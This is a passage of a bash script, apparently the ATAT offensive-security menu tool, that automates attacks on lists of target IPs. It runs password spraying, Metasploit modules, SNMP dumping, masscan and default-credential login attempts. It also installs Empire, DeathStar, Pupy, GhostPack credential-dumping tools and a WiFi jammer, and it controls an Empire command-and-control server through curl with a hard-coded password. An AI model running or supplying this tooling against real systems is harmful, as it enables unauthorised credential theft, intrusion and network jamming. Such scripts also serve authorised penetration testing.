            read -p 'Set PLATFORM: ' userplatform; read -p 'Set Username List: ' usernames; read -p 'Set Password List: ' userpasswords; read -p 'Set Attempts Per Lockout (Example: 1): ' userattempts; read -p 'Set Lockout Period In Minutes (Example: 35): ' userlockout; read -p 'Set DOMAIN (SMB Mode Only): ' userdomain; read -p 'Set RequestsFile (OWA Mode Only): ' userrequestsfile;
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~/ATAT/Spray_output.txt
	for IP in $(cat $inputfile)
	do
	~/Spray/spray.sh -$userplatform $IP $usernames $userpasswords $userattempts $userlockout $userdomain $userrequestsfile | tee -a $outputfile
	done
		echo -e "\E[1;34m::::: \e[97mAll Output Has Been Saved In Spray_output.txt \E[1;34m:::::"
			;;
		"Spray Password List Update")
		echo -e "\E[1;34m::::: \e[97mAn Optional Company Name Can Also Be Provided To Add To The List \E[1;34m:::::"
		echo -e "\E[1;34m::::: \e[97mYou Can Leave This Company Option Blank If You Just Want A Generic Updated List \E[1;34m:::::"
			read -p 'Set Password List to Update: ' userplist; read -p 'Set Company Name (Optional): ' usercompany;
	~/Spray/spray.sh -passupdate $userplist $usercompany
		echo -e "\E[1;34m::::: \e[97mSelected Password List Update Process Has Been Completed \E[1;34m:::::"
			;;
#	"Username Generation")

#A username list can also be generated from a list of common names


#Usage: spray.sh -genusers <firstnames> <lastnames> "<<fi><li><fn><ln>>"
#Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fi><ln>"
#Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt "<fn>.<ln>"  
#			;;       
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

 "7" | "7" )
         
echo -e "\E[1;34m::::: \e[97mScan All The Things!! \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 12=Main Menu | 13=QUIT: '
options=("Multi-Port Auxiliary" "Multi-Target/Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target SSLScan - With Masscan Results" "Multi-Target SSLScan - With Nmap Results" "Multi-Target Masscan of All TCP Ports" "Bloodhound" "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" "changeme - Default Credential Checker" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
	"Multi-Port Auxiliary")
	
            read -p 'Set MODULE_PATH: ' usermodule; read -p 'Set RHOSTS: ' usertarget;
	inputfile=~/ATAT/MSF_AUX_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -q -x "use $usermodule;\
	set RHOSTS $usertarget;\
	set RPORT $PORT;\
	run;\
	exit" | tee -a ~/ATAT/Multi_Port_AUX_logs.txt
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned; Output Is In ~/ATAT/Multi_Port_AUX_logs.txt \E[1;34m:::::"
            ;;
    "Multi-Target/Port Auxiliary")
	echo -e "\E[1;34m::::: \e[97mBecause Sometimes You Need To Hit More Targets Than The MSF RHOSTS Option Can Handle \E[1;34m:::::"
   	echo -e "\E[1;34m::::: \e[97mRemember To Have Your Targets In ~/ATAT/MSF_targets.txt \E[1;34m:::::"
        
            read -p 'Set MODULE_PATH: ' usermodule;
	inputfile=~/ATAT/MSF_AUX_target_ports.txt
	targetfile=~/ATAT/MSF_targets.txt
	for PORT in $(cat $inputfile)
	do
	msfconsole -q -x "use $usermodule;\
	set RHOSTS file:$targetfile;\
	set RPORT $PORT;\
	run;\
	exit" | tee -a ~/ATAT/Multi_TargetPort_AUX_logs.txt
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned; Output Is In ~/ATAT/Multi_TargetPort_AUX_logs.txt \E[1;34m:::::"
            ;;
    "Multi-Target SNMP Enumeration")
    echo -e "\E[1;34m::::: \e[97mDump All The SNMP!! \E[1;34m:::::"
            read -p 'Set RPORT (default=161): ' targetport; read -p 'Set Community String (default=public): ' userstring; read -p 'Set SNMP Version (default=1): ' userversion;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum;\
	set RPORT $targetport;\
	set RHOSTS $IP;\
	set COMMUNITY $userstring;\
	set VERSION $userversion;\
	run;\
	exit" | tee -a ~/ATAT/SNMP_logs.txt
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets' SNMP Have Been Enumerated! \E[1;34m:::::"
            ;;
     "Multi-Target Load Balancer Detection")
	echo -e "\E[1;34m::::: \e[97mMulti-Target Load Balancer Detection \E[1;34m:::::"		
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~LBD_Results_temp.txt
	for IP in $(cat $inputfile)
	do
	lbd $IP | tee $outputfile
	cat $outputfile >> LBD_Results.txt
	done
	rm $outputfile
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Processed! \E[1;34m:::::"
            ;;
    "Multi-Target SSLScan")
	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=SSLScan_Results.txt
	for IP in $(cat $inputfile)
	do
	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee -a $outputfile
		
	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
	done
                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
            ;;
    "Multi-Target SSLScan - With Masscan Results")
	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
	inputfile=~SSLScan_masscan_results.txt
	outputfile=~SSLScan_Results.txt
	for IP in $(cat $inputfile)
	do
	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee -a $outputfile
		
	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
	done
                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
            ;;
    "Multi-Target SSLScan - With Nmap Results")
	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan \E[1;34m:::::"		
	inputfile=SSLScan_nmap_results.txt
	outputfile=~SSLScan_Results.txt
	for IP in $(cat $inputfile)
	do
	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee -a $outputfile
		
	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
	done
                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results! \E[1;34m:::::"
            ;;
    "Multi-Target Masscan of All TCP Ports")
 echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports \E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Main Menu" "Quit")
select opt in "${options[@]}"
	do
		case $opt in
		"Run")
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~masscan_results.txt
	for IP in $(cat $inputfile)
	do
	masscan $IP -p0-65535 --rate 1000 | tee -a $outputfile
	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
	sed "/Discovered open port /s/Discovered open port /""/g" ~masscan_results.txt > ~masscan_results1.txt
	awk -F/ '{ print $2 ":" $1 }' ~masscan_results1.txt > ~masscan_results2.txt
	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
	rm ~masscan_results*.txt
	done
            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned! \E[1;34m:::::"
            ;;
        "Options (enter manual targets for pause/resume support)")
	outputfile=~masscan_results.txt
	read -p 'Enter Target IPs (space delimited):' usertargets;
	masscan $usertargets -p0-65535 --rate 1000 | tee -a $outputfile
	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
	sed "/Discovered open port /s/Discovered open port /""/g" ~masscan_results.txt > ~masscan_results1.txt
	awk -F/ '{ print $2 ":" $1 }' ~masscan_results1.txt > ~masscan_results2.txt
	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
	rm ~masscan_results*.txt
            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned! \E[1;34m:::::"
            ;;
        "Resume")
    masscan --resume paused.conf
			;;           
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
		esac
	done
	        ;;
	"Bloodhound")
        xterm -e neo4j console &
        sleep 15
        xterm -e bloodhound &
        sleep 30
        firefox http://localhost:7474 &
			echo -e "\E[1;34m::::: \e[97mIn Firefox Interface \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mLogin to Neo4j Console With User:neo4j & Password:neo4j and Change Defalt Password \E[1;34m:::::"
            echo ""
            echo -e "\E[1;34m::::: \e[97mIn Bloodhound Interface \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter bolt://127.0.0.1:7687 in Database Field \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter neo4j In Username Field \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter Newly Created Password In Password Field Unless You Left It As Defalut Of neo4j \E[1;34m:::::"
            echo ""
            echo -e "\E[1;34m::::: \e[97mCheck Empire & DeathStar Menu For \"Execute Bloodhound Data Collection\" Option To Automate Bloodhound Data Collection Once A PSE Agent Is Active On Your Target \E[1;34m:::::"
            echo ""
            echo -e "\E[1;34m::::: \e[97mThe neo4j Firefox Interface Does Not Need To Remain Open \E[1;34m:::::"
            #echo ""
            #echo -e "\E[1;34m::::: \e[97m***To Make neo4j Accept Connections Remotely You Must Make The Following Edits**\E[1;34m:::::"
            #echo -e "\E[1;34m::::: \e[97m***THIS ONLY NEEDS TO BE DONE ONCE!***\E[1;34m:::::"
			#echo -e "\E[1;34m::::: \e[97m**Open /usr/share/neo4j/conf/neo4j.conf With root Privileges**\E[1;34m:::::"
			#echo -e "\E[1;34m::::: \e[97mIn /usr/share/neo4j/conf/neo4j.conf You Must Uncomment This Line: dbms.connectors.default_listen_address=0.0.0.0\E[1;34m:::::"
			#echo -e "\E[1;34m::::: \e[97mThen Save /usr/share/neo4j/conf/neo4j.conf, Kill The 2 xterm Windows Opened By Running This Option & Re-Run This Option Again\E[1;34m:::::"
			;;
	"Extract All IP:Port Combos From Nmap Output For SSLScan Processing")
	        echo -e "\E[1;34m::::: \e[97mNmap Output From \"Intense\" Scan Profiles Only \E[1;34m:::::"
	read -p 'Enter Full Path Including File Name Of Nmap Output (/root/output.xml):' useroutput;
	#cat $useroutput | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
	sed "/Discovered open port /s/Discovered open port /""/g" $useroutput > ~nmap_results1.txt
	awk -F/ '{ print $2 ":" $1 }' ~nmap_results1.txt > ~nmap_results2.txt
	sed "/tcp on /s/tcp on /""/g" ~nmap_results2.txt >> ~nmap_results3.txt
	sed "/ /s/ /""/g" ~nmap_results3.txt >> ~nmap_results4.txt
	grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}' ~nmap_results4.txt >> SSLScan_nmap_results.txt
	rm ~nmap_results*.txt
            echo -e "\E[1;34m::::: \e[97mNmap Output Has Been Processed. Results Are In ~/ATAT/SSLScan_nmap_results.txt \E[1;34m:::::"
            ;;
    "changeme - Default Credential Checker")
     echo -e "\E[1;34m::::: \e[97mchangeme Default Password Checker WILL Attempt To Login To The Systems You Are Scanning. This Is NOT Passive. \E[1;34m:::::"
			inputfile=~/ATAT/MSF_targets.txt
     for IP in $(cat $inputfile)
     do
     python ~/changeme/changeme.py -a --timeout 5 $IP --fresh | tee -a ~/ATAT/Default_Creds.txt
     done
     echo -e "\E[1;34m::::: \e[97mAll Results Have Been Saved To ~/ATAT/Default_Creds.txt \E[1;34m:::::"
           ;;
    "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
    "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;
  
"8" | "8" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!! \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 13=Main Menu | 14=QUIT: '
options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "changeme Install" "Apt Update Fix" "Pupy Install" "BeRoot Install" "GhostPack Install" "Hashcat Install" "Non-Security Debian Distros-BETA" "Main Menu" "Quit") #"HostAPD-WPE via Github"
select opt in "${options[@]}"
do
    case $opt in
		"Powershell Empire & DeathStar")
		git clone https://github.com/EmpireProject/Empire ~/Empire
		cd ~/Empire/setup && chmod +x install.sh && pip install editorconfig && pip install hackersh && pip install wafw00f && pip install Markdown && pip install pysnmp && pip install jsbeautifier && pip install mitmproxy && ./install.sh && cd .. && chmod +x empire && cd ..
		git clone https://github.com/byt3bl33d3r/DeathStar ~/DeathStar
		cd ~/DeathStar && pip install -r requirements.txt && pip3 install -r requirements.txt
		cd ..
		echo -e "\e[1;34m[*] Install Of Powershell Empire & DeathStar Complete\e[0m\n"
		echo -e "\e[1;34m[*] If You Get Errors About \"building cryptography\", then manually run /root/Empire/setup/install.sh & then /root/Empire/setup/reset.sh \e[0m\n"
			;;
        "Dependencies")
		clear
		echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
		sleep 3
		apt-get update
		echo ""
		echo -e "\e[1;32m[+] APT Update complete...\e[0m"
		sleep 3
		clear
		echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
		sleep 3
		clear
#		updatedb
		mkdir /tmp/ATAT/
		echo ""

	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap macchanger apache2 lbd masscan msfpc sslscan libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv p7zip"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the repository.\e[0m"
				touch /tmp/ATAT/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
				isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/ATAT/
			;;
		"DBD Installer")
		dbdinstalled=$(ls /usr/bin/dbd)
		if [ "$dbdinstalled" == "/usr/bin/dbd" ]; then
			echo -e "\n\e[1;34m[*] I see that DBD is already installed...\e[0m"
			echo ""
			sleep 3
			echo "Aufiederszehn" && ~/ATAT/ATAT.sh
		else
			echo -e "\e[1;34m[*] Performing DBD install...\e[0m\n"
			clear
			echo -e "\e[1;34mPlease wait while I install DBD on your machine...\e[0m"
			echo ""
			sleep 3
			cp ~/ATAT/misc/dbd/conf/dbd_defaults.conf ~/ATAT/misc/dbd/dbd.h
			cd ~/ATAT/misc/dbd/
			make unix
			chmod +x dbd
			cp dbd ~/ATAT/misc/dbd/binaries/
			mv dbd /usr/bin/
			cd ~/ATAT/
			echo "" 
			echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
			echo ""
			sleep 3
	fi
			;;
		#"HostAPD-WPE via Github")
		#git clone https://github.com/OpenSecurityResearch/hostapd-wpe ~/hostapd-wpe
		#wget https://w1.fi/releases/hostapd-2.6.tar.gz ~/hostapd-2.6.tar.gz
		#tar -xvf ~/hostapd-2.6.tar
		#cd ~/hostapd-2.6
		#patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
		#cd hostapd
		#make cd ../ ../hostapd-wpe/certs ./bootstrap
		#echo -e "\e[1;34m[*] Installing & Patching HostAPD-WPE ...\e[0m\n"
			#;;
		"Airgeddon Install Workaround")
	rm airgeddon_*_all.deb airgeddon.deb
	wget https://raw.githubusercontent.com/v1s1t0r1sh3r3/airgeddon/master/binaries/kali/airgeddon_{8..10}.{0..4}{0..4}-{0..3}_all.deb 
    #The above command will need to be periodically updated as the major version goes beyond 8-10. This is hacky and terribly wasteful from a resource perspective; but will do for the time being.
    mv airgeddon_*_all.deb airgeddon.deb
	chmod +x airgeddon.deb
	dpkg -i airgeddon.deb
	echo -e "\e[1;34m[*] Install Of Airgeddon Complete\e[0m\n"
	echo -e "\e[1;34m[*] If Airgeddon Workaround fails, manually navigate to https://github.com/v1s1t0r1sh3r3/airgeddon/tree/master/binaries/kali/ ...\e[0m\n"
	echo -e "\e[1;34m[*] Download Current airgeddon_#.##-#_all.deb file, then run with e[31m dpkg -i airgeddon*.deb\e[97m...\e[0m\n"
			;;
		"WiFi Jammer Install")
	git clone https://github.com/MisterBianco/wifijammer-ng ~/wifijammer-ng
	cd ~/wifijammer-ng
	pip install -r requirements.txt
	chmod +x wifijammer.py && chmod +x wifijammer-ng.py
	echo -e "\e[1;34m[*] Install Of WiFiJammer-ng Complete\e[0m\n"
			;;
		"changeme Install")
	git clone https://github.com/ztgrace/changeme ~/changeme
	cd ~/changeme
	sudo pip install nmapparser
	pip install tabulate
	sudo pip install -r requirements.txt
	chmod +x changeme.py
	echo -e "\e[1;34m[*] Install Of changeme Complete\e[0m\n"
			;;
		"Apt Update Fix")
	rm -rf /var/lib/apt/lists && apt-get update && apt-get install kali-archive-keyring -y --allow-unauthenticated && apt-get install dirmngr --install-recommends -y --allow-unauthenticated && apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
	echo -e "\e[1;34m[*] Process Complete. This Should Only Ever Need To Be Run ONCE!\e[0m\n"
			;;
		"Pupy Install")
	git clone --recursive https://github.com/n1nj4sec/pupy ~/pupy
	cd ~/pupy
	export PATH=$PATH:~/.local/bin
	python create-workspace.py -DG pupyw
	export PATH=$PATH:~/.local/bin
	echo -e "\E[1;34m::::: \e[97m[*] Install Of Pupy Complete\E[1;34m:::::"
			;;
		"BeRoot Install")
	git clone https://github.com/AlessandroZ/BeRoot ~/BeRoot
	cd ~/BeRoot/Windows
	pip install -r requirements.txt
	echo -e "\E[1;34m::::: \e[97m[*] Install Of BeRoot Complete\E[1;34m:::::"
			;;
		"Spray Install")
	git clone https://github.com/SpiderLabs/Spray ~/Spray
	echo -e "\E[1;34m::::: \e[97m[*] Install Of Spray Complete\E[1;34m:::::"
			;;
		"GhostPack Install")
	git clone https://github.com/GhostPack/Rubeus ~/GhostPack/Rubeus
	git clone https://github.com/GhostPack/Seatbelt ~/GhostPack/Seatbelt
	git clone https://github.com/GhostPack/SharpRoast ~/GhostPack/SharpRoast
	git clone https://github.com/GhostPack/SharpUp ~/GhostPack/SharpUp
	git clone https://github.com/GhostPack/SharpDPAPI ~/GhostPack/SharpDPAPI
	git clone https://github.com/GhostPack/SharpDump ~/GhostPack/SharpDump
	git clone https://github.com/GhostPack/SafetyKatz ~/GhostPack/SafetyKatz
	git clone https://github.com/GhostPack/SharpWMI ~/GhostPack/SharpWMI
	echo -e "\E[1;34m::::: \e[97m[*] Download Of GhostPack Source Code Complete\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] Move GhostPack Folder To Windows Machine With Visual Studio 2015 Community Edition Installed\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] Simply Open Up The Project's .sln File In Visual Studio 2015 Community Edition, choose \"Build\" Menu, then click \"Build Solution\".\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] Your EXE Will Be Located In drive:\<project_folder>\<project_name>\bin\Debug \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] Example D:\SafetyKatz\SafetyKatz\bin\Debug\SafetyKatz.exe \E[1;34m:::::"
			;;
		"Hashcat Install")
	wget https://hashcat.net/files/hashcat-5.1.0.7z
	p7zip -d hashcat-5.1.0.7z
	mv hashcat-5.1.0 ~/hashcat
	cd ~/hashcat 
	chmod +x hashcat64.bin
	chmod +x hashcat32.bin
	git clone https://github.com/NotSoSecure/password_cracking_rules ~/ORTRTA
	cp ~/ORTRTA/OneRuleToRuleThemAll.rule ~/hashcat/rules
	rm -rf ~/ORTRTA
		echo -e "\E[1;34m::::: \e[97m[*] Download & Install Of Hashcat Complete\E[1;34m:::::"
			;;
		"Non-Security Debian Distros-BETA")
	echo -e "\E[1;34m::::: \e[97m[*] This is a BETA installer for core security tools found in distros like Kali, ParrotOS, etc. \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] It is HIGHLY recommended you use such security distributions instead of using this installer! \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97m[*] DO NOT use this BETA installer if you are on a distro like Kali, ParrotOS, etc. \E[1;34m:::::"
	echo ""
	echo -e "\E[1;34m\e[97m \e[31m[*] Press CTRL+C to cancel if you are on a distro like Kali, ParrotOS, etc. or risk corrupting your installations\e[97m\E[1;34m"
	echo ""
	echo -e "\E[1;34m::::: \e[97m[*] You have been warned.. \E[1;34m:::::"
	echo ""
	read -p "Press Enter When Ready To Proceed"
	echo ""
	echo -e "\E[1;34m::::: \e[97m[*] Seriously, DO NOT use this BETA installer if you are on a distro like Kali, ParrotOS, etc. Didn't you hear me?!\E[1;34m:::::"
	echo ""
	read -p "Press Enter When Ready To Proceed"
	echo ""
		if [ ! -z $(cat /etc/*-release | grep DISTRIB_ID=*"Parrot"*) ]; then
				echo -e "\e[1;31m[-] (╯°□°）╯︵ ┻━┻ Clearly someone isn't too bright. Didn't I warn you about running this on Parrot?! \e[0m"
				sleep 15
				~/ATAT/ATAT.sh
			else 
				if [ ! -z $(cat /etc/*-release | grep DISTRIB_ID=*"Kali"*) ]; then
				echo -e "\e[1;31m[-] (╯°□°）╯︵ ┻━┻ Clearly someone isn't too bright. Didn't I warn you about running this on Kali?!\e[0m"
				sleep 15
				~/ATAT/ATAT.sh
				else
reqs="gcc gcc-mingw-w64-i686 curl jq bettercap macchanger metasploit-framework john nmap armitage apache2 lbd masscan msfpc sslscan libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv p7zip"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the repository.\e[0m"
				touch /tmp/ATAT/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
				isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/ATAT/
						echo ""
						sleep 2
				fi
			fi
	echo -e "\E[1;34m::::: \e[97mAll installs have, hopefully, completed successfully \E[1;34m:::::"
			;;
		"Main Menu")
            ~/ATAT/ATAT.sh
            ;;
		"Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 

;;

   "9" | "9" )
          
echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mEmpire & DeathStar MUST be installed in /root/!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 23=Main Menu | 24=QUIT: '
options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Execute Bloodhound Data Collection - Local" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit") #"Execute Bloodhound Data Collection - Remote"
select opt in "${options[@]}"
do
    case $opt in
        "Step 1 - Launch Powershell Empire & RESTful API")
    # Start the Empire console & RESTful API
	echo -e "\E[1;34m::::: \e[97mLaunching Powershell Empire & RESTful API \E[1;34m:::::"
	cd ~/Empire && python empire --rest --username empireadmin --password Password123
	cd ..
	        ;;
        "Step 2 - Launch DeathStar (Optional)")
    echo -e "\E[1;34m::::: \e[97mLaunching DeathStar \E[1;34m:::::"
    python3 ~/DeathStar/DeathStar.py
    	    ;;
    	"Step 3 - Acquire PSE REST API Permanent Token")
    outputfile=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE C2 Token (API Auth): ' usertoken;
    	curl --insecure -i https://$userlistener:$userport/api/admin/permanenttoken?token=$usertoken | tee ~/ATAT/PSE_perm_token_pre.txt
    	cat ~/ATAT/PSE_perm_token_pre.txt | egrep -o '([a-zA-Z0-9]{40})' > $outputfile
    	rm ~/ATAT/PSE_perm_token_pre.txt
			;;
		"Start PSE Listener")
    pseauthtoken=~/ATAT/PSE_perm_token.txt
    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Listener Name: ' userlname;
		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/listeners/http?token=$(cat $pseauthtoken) -X POST -d '{"Name":"'$userlname'"}'
